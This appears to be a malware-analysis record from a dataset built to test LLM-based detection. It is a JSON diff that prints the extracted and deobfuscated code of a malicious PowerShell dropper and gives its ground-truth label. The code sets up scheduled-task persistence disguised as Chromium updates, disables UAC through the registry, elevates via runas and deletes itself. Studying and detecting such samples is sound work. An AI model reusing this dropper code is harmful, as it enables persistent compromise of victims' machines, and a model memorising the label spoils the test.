@@ -1,0 +1,122 @@
+{
+  "meta": {
+    "quelldatei": "0b6d43368ade45f7316d8b73ef0ae6e3c9b9849e9e9ff86a6bb62d219b565cf0.ps1",
+    "sha256": "0b6d43368ade45f7316d8b73ef0ae6e3c9b9849e9e9ff86a6bb62d219b565cf0",
+    "groesse_bytes": 1135476,
+    "zeilen": 164,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": true,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "C:\\ProgramData\\holatyrimakachola",
+      "\r\nPowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"schtasks /create /sc MINUTE /mo 120 /tn Appligation /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs\"\"\",0\r\n.Run \"schtasks /create /sc MINUTE /mo 45 /tn ChromiumPluginupdate /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs\"\"\",0\r\nEnd With\r\nWScript.Sleep 10000\r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\nstrScript = Wscript.ScriptFullName\r\nobjFSO.DeleteFile(strScript)\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs\",0\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\",0\r\nEnd With\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\r\n  CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\r\n    , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\r\n  WScript.Quit\r\nEnd If\r\nOn Error Resume Next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\", 0, True\r\n.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\",\"0\", \"REG_DWORD\"\r\n.Run \"schtasks /delete /tn ChromiumPluginupdate /f\", 0, True\r\nEnd With\r\nWScript.Sleep 100\r\nWScript.Sleep 10000\r\nWScript.Sleep 10000\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\nSet oFso = CreateObject(\"Scripting.FileSystemObject\") : oFso.DeleteFile Wscript.ScriptFullName, True\r\n\r\n",
+      "t Beat my Brain\r\n",
+      "A.I Can",
+      "Master Xaviar\r\n\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs",
+      "\r\ntry \r\n{\r\nStop-Process -Name \"msbuild\"\r\nStop-Process -Name \"CasPol\"\r\nStop-Process -Name \"jsc\"\r\nStop-Process -Name \"cmstp\"\r\nStop-Process -Name \"mshta\"\r\n} catch { }\r\nstart-sleep 5\r\nFunction asjdiwWWWW($Yatak) {\r\n    $byteList = [System.Collections.Generic.List[Byte]]::new()\r\n    for ($i = 0; $i -lt $Yatak.Length; $i +=8) {\r\n        $byteList.Add([Convert]::ToByte([String] $Yatak.Substring($i, 8), 2))\r\n    }\r\n    return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())\r\n}\r\nFunction holakabutr([String] $IN) {\r\n    $RNBX1 = $IN.Replace(",
+      "000",
+      ")\r\n    $bytes = New-Object -TypeName byte[] -ArgumentList ($RNBX1.Length / 1+1+0)\r\n    for ($i = 0; $i -lt $RNBX1.Length; $i += 1+1+0) {\r\n        $bytes[$i / 2] = [Convert]::ToByte($RNBX1.Substring($i, 1+1+0), 6+10+0)\r\n    }\r\n    return [byte[]]$bytes\r\n}\r\n\r\n\r\nstart-sleep 4\r\n\r\n\r\n$CLE11 = "
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [
+      "C:\\ProgramData\\holatyrimakachola",
+      "\r\nPowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"schtasks /create /sc MINUTE /mo 120 /tn Appligation /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs\"\"\",0\r\n.Run \"schtasks /create /sc MINUTE /mo 45 /tn ChromiumPluginupdate /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs\"\"\",0\r\nEnd With\r\nWScript.Sleep 10000\r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\nstrScript = Wscript.ScriptFullName\r\nobjFSO.DeleteFile(strScript)\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs\",0\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\",0\r\nEnd With\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\r\n  CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\r\n    , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\r\n  WScript.Quit\r\nEnd If\r\nOn Error Resume Next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\", 0, True\r\n.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\",\"0\", \"REG_DWORD\"\r\n.Run \"schtasks /delete /tn ChromiumPluginupdate /f\", 0, True\r\nEnd With\r\nWScript.Sleep 100\r\nWScript.Sleep 10000\r\nWScript.Sleep 10000\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\nSet oFso = CreateObject(\"Scripting.FileSystemObject\") : oFso.DeleteFile Wscript.ScriptFullName, True\r\n\r\n",
+      "t Beat my Brain\r\n",
+      "A.I Can",
+      "Master Xaviar\r\n\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs",
+      "\r\ntry \r\n{\r\nStop-Process -Name \"msbuild\"\r\nStop-Process -Name \"CasPol\"\r\nStop-Process -Name \"jsc\"\r\nStop-Process -Name \"cmstp\"\r\nStop-Process -Name \"mshta\"\r\n} catch { }\r\nstart-sleep 5\r\nFunction asjdiwWWWW($Yatak) {\r\n    $byteList = [System.Collections.Generic.List[Byte]]::new()\r\n    for ($i = 0; $i -lt $Yatak.Length; $i +=8) {\r\n        $byteList.Add([Convert]::ToByte([String] $Yatak.Substring($i, 8), 2))\r\n    }\r\n    return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())\r\n}\r\nFunction holakabutr([String] $IN) {\r\n    $RNBX1 = $IN.Replace(",
+      "000",
+      ")\r\n    $bytes = New-Object -TypeName byte[] -ArgumentList ($RNBX1.Length / 1+1+0)\r\n    for ($i = 0; $i -lt $RNBX1.Length; $i += 1+1+0) {\r\n        $bytes[$i / 2] = [Convert]::ToByte($RNBX1.Substring($i, 1+1+0), 6+10+0)\r\n    }\r\n    return [byte[]]$bytes\r\n}\r\n\r\n\r\nstart-sleep 4\r\n\r\n\r\n$CLE11 = "
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [
+      "New-Item",
+      "New-Object",
+      "Stop-Process"
+    ],
+    "auffaellige_tokens": {
+      "executionpolicy_bypass": 1,
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\holatyrimakachola",
+        "C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs",
+        "C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1",
+        "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat",
+        "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs",
+        "C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "C:\\ProgramData\\holatyrimakachola",
+      "\r\nPowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"schtasks /create /sc MINUTE /mo 120 /tn Appligation /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs\"\"\",0\r\n.Run \"schtasks /create /sc MINUTE /mo 45 /tn ChromiumPluginupdate /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs\"\"\",0\r\nEnd With\r\nWScript.Sleep 10000\r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\nstrScript = Wscript.ScriptFullName\r\nobjFSO.DeleteFile(strScript)\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs\",0\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\",0\r\nEnd With\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs",
+      "\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\r\n  CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\r\n    , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\r\n  WScript.Quit\r\nEnd If\r\nOn Error Resume Next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\", 0, True\r\n.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA\",\"0\", \"REG_DWORD\"\r\n.Run \"schtasks /delete /tn ChromiumPluginupdate /f\", 0, True\r\nEnd With\r\nWScript.Sleep 100\r\nWScript.Sleep 10000\r\nWScript.Sleep 10000\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\nSet oFso = CreateObject(\"Scripting.FileSystemObject\") : oFso.DeleteFile Wscript.ScriptFullName, True\r\n\r\n",
+      "t Beat my Brain\r\n",
+      "A.I Can",
+      "Master Xaviar\r\n\r\n\r\n",
+      "C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs",
+      "\r\ntry \r\n{\r\nStop-Process -Name \"msbuild\"\r\nStop-Process -Name \"CasPol\"\r\nStop-Process -Name \"jsc\"\r\nStop-Process -Name \"cmstp\"\r\nStop-Process -Name \"mshta\"\r\n} catch { }\r\nstart-sleep 5\r\nFunction asjdiwWWWW($Yatak) {\r\n    $byteList = [System.Collections.Generic.List[Byte]]::new()\r\n    for ($i = 0; $i -lt $Yatak.Length; $i +=8) {\r\n        $byteList.Add([Convert]::ToByte([String] $Yatak.Substring($i, 8), 2))\r\n    }\r\n    return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())\r\n}\r\nFunction holakabutr([String] $IN) {\r\n    $RNBX1 = $IN.Replace(",
+      "000",
+      ")\r\n    $bytes = New-Object -TypeName byte[] -ArgumentList ($RNBX1.Length / 1+1+0)\r\n    for ($i = 0; $i -lt $RNBX1.Length; $i += 1+1+0) {\r\n        $bytes[$i / 2] = [Convert]::ToByte($RNBX1.Substring($i, 1+1+0), 6+10+0)\r\n    }\r\n    return [byte[]]$bytes\r\n}\r\n\r\n\r\nstart-sleep 4\r\n\r\n\r\n$CLE11 = "
+    ],
+    "string_anzahl_gesamt": 15,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [
+      "New-Item",
+      "New-Object",
+      "Stop-Process"
+    ],
+    "auffaellige_tokens": {
+      "executionpolicy_bypass": 1,
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\holatyrimakachola",
+        "C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs",
+        "C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1",
+        "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat",
+        "C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs",
+        "C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs"
+      ]
+    },
+    "deobfuskiert_auszug": "$L1 = \"C:\\ProgramData\\holatyrimakachola\"\r\nNew-Item $L1 -ItemType Directory -Force\r\nstart-sleep 2\r\n$Content = @'\r\nPowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command C:\\ProgramData\\holatyrimakachola\\GOLGAPORA.PS1\r\n'@\r\n[IO.File]::WriteAllText(\"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\", $Content)\r\n$Content = @'\r\non error resume next\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"schtasks /create /sc MINUTE /mo 120 /tn Appligation /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs\"\"\",0\r\n.Run \"schtasks /create /sc MINUTE /mo 45 /tn ChromiumPluginupdate /F /tr \"\"C:\\ProgramData\\holatyrimakachola\\ChromeExtentionUpdate.vbs\"\"\",0\r\nEnd With\r\nWScript.Sleep 10000\r\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\r\nstrScript = Wscript.ScriptFullName\r\nobjFSO.DeleteFile(strScript)\r\n'@\r\n\r\n[IO.File]::WriteAllText(\"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs\", $Content)\r\n\r\n$Content = @'\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.vbs\",0\r\n.run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\",0\r\nEnd With\r\n\r\nSet hole = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\r\nhole.Namespace(7).CopyHere WScript.ScriptFullName, 4 + 16 + 1024 + 0 + 0\r\n\r\n'@\r\n\r\n[IO.File]::WriteAllText(\"C:\\ProgramData\\holatyrimakachola\\helloitsindian.vbs\", $Content)\r\n\r\n$Content = @'\r\non error resume next\r\non error resume next\r\non error resume next\r\nWScript.Sleep(1000)\r\nIf Not WScript.Arguments.Named.Exists(\"elevate\") Then\r\n  CreateObject(\"Shell.Application\").ShellExecute WScript.FullName _\r\n    , \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevate\", \"\", \"runas\", 1\r\n  WScript.Quit\r\nEnd If\r\nOn Error Resume Next\r\nWScript.Sleep(1000)\r\nWith CreateObject(\"WScript.Shell\")\r\n.Run \"C:\\ProgramData\\holatyrimakachola\\JIGIJIGI.bat\", 0, True\r\n.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
